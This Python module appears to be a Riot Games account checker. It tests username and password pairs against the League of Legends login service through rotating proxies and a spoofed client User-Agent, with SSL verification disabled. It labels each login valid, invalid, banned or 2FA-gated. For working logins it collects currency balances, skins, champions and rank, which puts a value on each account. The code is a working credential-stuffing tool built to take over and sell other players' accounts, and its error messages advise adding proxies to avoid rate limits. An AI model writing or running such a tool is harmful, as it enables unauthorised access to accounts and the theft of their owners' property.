"""Riot Games authentication and data fetching."""

from __future__ import annotations

import json
import re
import ssl
import warnings
from urllib.parse import parse_qs, urlparse

import httpx

from config import AUTH_URL, ENTITLEMENTS_URL, PLATFORM_MAP, USERINFO_URL
from models import AccountResult

# Suppress SSL warnings
warnings.filterwarnings("ignore")

_HEADERS = {
    "User-Agent": (
        "RiotClient/91.0.2.5765.4789 rso-auth (Windows;10;;Professional, x64)"
    ),
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}


def _build_client(proxy: str | None, timeout: int) -> httpx.Client:
    # Create a permissive SSL context
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT@SECLEVEL=1")

    return httpx.Client(
        headers=_HEADERS.copy(),
        timeout=httpx.Timeout(timeout, connect=timeout),
        follow_redirects=False,
        proxy=proxy,
        verify=False,
    )


def check_account(
    username: str,
    password: str,
    proxy: str | None = None,
    timeout: int = 15,
    verbose: bool = False,
) -> AccountResult:
    """Authenticate and fetch all account data."""
    result = AccountResult(username=username, password=password)

    for attempt in range(2):  # Retry once on failure
        client = _build_client(proxy, timeout)
        try:
            # Step 1: Initialize auth session (get cookies)
            init_body = {
                "client_id": "riot-client",
                "nonce": "1",
                "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token",
                "scope": "account openid",
            }
            init_resp = client.post(AUTH_URL, json=init_body)

            if verbose:
                result.error_message = f"init:{init_resp.status_code}"

            if init_resp.status_code not in (200, 201):
                result.status = "ERROR"
                result.error_message = f"Init failed: HTTP {init_resp.status_code}"
                if attempt == 0:
                    client.close()
                    continue
                return result

            # Step 2: Submit credentials
            auth_body = {
                "type": "auth",
                "username": username,
                "password": password,
                "remember": True,
                "language": "en_US",
            }
            resp = client.put(AUTH_URL, json=auth_body)

            if resp.status_code not in (200, 201):
                result.status = "ERROR"
                result.error_message = f"Auth failed: HTTP {resp.status_code}"
                if attempt == 0:
                    client.close()
                    continue
                return result

            try:
                data = resp.json()
            except Exception:
                result.status = "ERROR"
                result.error_message = f"JSON parse error: {resp.text[:80]}"
                return result

            resp_type = data.get("type", "")

            if resp_type == "response":
                uri = data.get("response", {}).get("parameters", {}).get("uri", "")
                token = _extract_token(uri)
                if not token:
                    result.status = "ERROR"
                    result.error_message = "Token extraction failed"
                    return result

                result.status = "VALID"
                _fetch_account_data(client, token, result)
                return result

            elif resp_type == "multifactor":
                result.status = "VALID"
                _try_basic_info(client, data, result)
                return result

            elif resp_type == "auth" and "error" in data:
                error = data["error"]
                if error == "auth_failure":
                    result.status = "INVALID"
                    return result
                elif error == "rate_limited":
                    result.status = "RATE_LIMITED"
                    result.error_message = "Rate limited - use more proxies"
                    return result
                else:
                    result.status = "ERROR"
                    result.error_message = f"Auth error: {error}"
                    return result
            else:
                result.status = "ERROR"
                result.error_message = f"Unknown type: {resp_type} | {str(data)[:60]}"
                return result

        except httpx.TimeoutException:
            result.status = "ERROR"
            result.error_message = f"Timeout (proxy: {proxy or 'none'})"
            if attempt == 0:
                client.close()
                continue
        except httpx.ProxyError as e:
            result.status = "ERROR"
            result.error_message = f"Proxy dead: {proxy}"
            if attempt == 0:
                client.close()
                continue
        except httpx.ConnectError as e:
            result.status = "ERROR"
            result.error_message = f"Connection failed: {str(e)[:60]}"
            if attempt == 0:
                client.close()
                continue
        except Exception as e:
            result.status = "ERROR"
            result.error_message = f"{type(e).__name__}: {str(e)[:80]}"
            if attempt == 0:
                client.close()
                continue
        finally:
            client.close()

    return result


def _extract_token(uri: str) -> str | None:
    """Extract access token from redirect URI fragment."""
    try:
        fragment = urlparse(uri).fragment
        params = parse_qs(fragment)
        tokens = params.get("access_token")
        return tokens[0] if tokens else None
    except Exception:
        return None


def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult):
    """Fetch detailed account information using the access token."""
    auth_header = {"Authorization": f"Bearer {token}"}

    # Get user info (region, summoner name, etc.)
    try:
        resp = client.get(USERINFO_URL, headers=auth_header)
        if resp.status_code == 200:
            info = resp.json()

            result.region = (
                info.get("lol_account", {}).get("summoner_region", "").upper()
            )
            if not result.region:
                result.region = info.get("region", {}).get("tag", "UNKNOWN").upper()

            result.summoner_name = info.get("lol_account", {}).get(
                "summoner_name", ""
            )
            if not result.summoner_name:
                result.summoner_name = info.get("acct", {}).get("game_name", "")

            result.level = info.get("lol_account", {}).get("summoner_level", 0)
            result.email_verified = info.get("email_verified", False)

            # Check bans
            ban_info = info.get("ban", {})
            if ban_info:
                restrictions = ban_info.get("restrictions", [])
                for r in restrictions:
                    rtype = r.get("type", "")
                    if rtype == "PERMANENT_BAN":
                        result.status = "BANNED"
                        result.ban_status = "PERMANENT"
                        break
                    elif "BAN" in rtype:
                        result.ban_status = "TEMPORARY"
    except Exception:
        pass

    # Get entitlement token
    entitlement_token = None
    try:
        resp = client.post(ENTITLEMENTS_URL, headers=auth_header, json={})
        if resp.status_code == 200:
            entitlement_token = resp.json().get("entitlements_token")
    except Exception:
        pass

    platform = PLATFORM_MAP.get(result.region, "")

    # Get store/inventory data
    if platform and entitlement_token:
        store_headers = {
            **auth_header,
            "X-Riot-Entitlements-JWT": entitlement_token,
        }
        _fetch_store_data(client, platform, store_headers, result)
        _fetch_ranked_data(client, platform, store_headers, result)


def _fetch_store_data(
    client: httpx.Client,
    platform: str,
    headers: dict,
    result: AccountResult,
):
    """Fetch store data: RP, BE, skins, champions."""
    region_lower = platform.lower()

    # Try wallet
    try:
        resp = client.get(
            f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/wallet",
            headers=headers,
        )
        if resp.status_code == 200:
            wallet = resp.json()
            result.rp = wallet.get("rp", 0)
            result.blue_essence = wallet.get("ip", 0)
    except Exception:
        pass

    # Try purchase history for skins/champions
    try:
        resp = client.get(
            f"https://{region_lower}.store.leagueoflegends.com"
            "/storefront/v3/history/purchase",
            headers=headers,
        )
        if resp.status_code == 200:
            inventory = resp.json()
            skins = []
            champs = []
            for item in inventory.get("transactions", []):
                inv_type = item.get("inventoryType", "")
                if inv_type == "CHAMPION_SKIN":
                    skins.append(str(item.get("itemId", "")))
                elif inv_type == "CHAMPION":
                    champs.append(str(item.get("itemId", "")))
            result.skins = skins
            result.skin_count = len(skins)
            result.champions = champs
            result.champion_count = len(champs)
    except Exception:
        pass

    # Fallback: misc view
    if result.skin_count == 0 and result.rp == 0:
        try:
            resp = client.get(
                f"https://{region_lower}.store.leagueoflegends.com"
                "/storefront/v3/view/misc",
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                result.rp = data.get("player", {}).get("rp", result.rp)
                result.blue_essence = data.get("player", {}).get(
                    "ip", result.blue_essence
                )
        except Exception:
            pass


def _fetch_ranked_data(
    client: httpx.Client,
    platform: str,
    headers: dict,
    result: AccountResult,
):
    """Fetch ranked information and summoner level."""
    region_lower = platform.lower()

    # Ranked stats
    try:
        resp = client.get(
            f"https://{region_lower}.ledge.leagueoflegends.com"
            "/leagues-ledge/v2/rankedStats/puuid",
            headers=headers,
        )
        if resp.status_code == 200:
            ranked = resp.json()
            queues = ranked.get("queues", [])
            for q in queues:
                if q.get("queueType") == "RANKED_SOLO_5x5":
                    tier = q.get("tier", "UNRANKED")
                    division = q.get("rank", "")
                    lp = q.get("leaguePoints", 0)
                    result.rank = f"{tier} {division} ({lp} LP)"
                    break
    except Exception:
        pass

    # Summoner level (if not already fetched from userinfo)
    if result.level == 0:
        try:
            resp = client.get(
                f"https://{region_lower}.ledge.leagueoflegends.com"
                "/summoner-ledge/v1/current",
                headers=headers,
            )
            if resp.status_code == 200:
                summoner = resp.json()
                result.level = summoner.get("summonerLevel", 0)
                if not result.summoner_name:
                    result.summoner_name = summoner.get("displayName", "")
        except Exception:
            pass


def _try_basic_info(client: httpx.Client, data: dict, result: AccountResult):
    """Extract whatever info we can from a 2FA-gated response."""
    email = data.get("multifactor", {}).get("email", "")
    method = data.get("multifactor", {}).get("method", "")
    if email:
        result.error_message = f"2FA ({method}) -> {email}"
    else:
        result.error_message = f"2FA ({method})"
